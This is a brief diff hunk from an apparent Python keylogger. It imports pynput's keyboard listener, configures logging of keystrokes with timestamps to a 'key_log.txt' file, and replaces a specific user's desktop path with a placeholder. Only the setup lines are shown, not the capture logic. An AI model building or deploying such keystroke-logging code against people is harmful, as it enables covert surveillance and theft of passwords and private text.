@@ -1,7 +1,7 @@
 from pynput.keyboard import Key, Listener
 import logging
 
-log_dir = "C:/Users/Cryptonic/Desktop/log/"
+log_dir = "C:/Users/<your user>/Desktop/log/"
 
 logging .basicConfig (filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
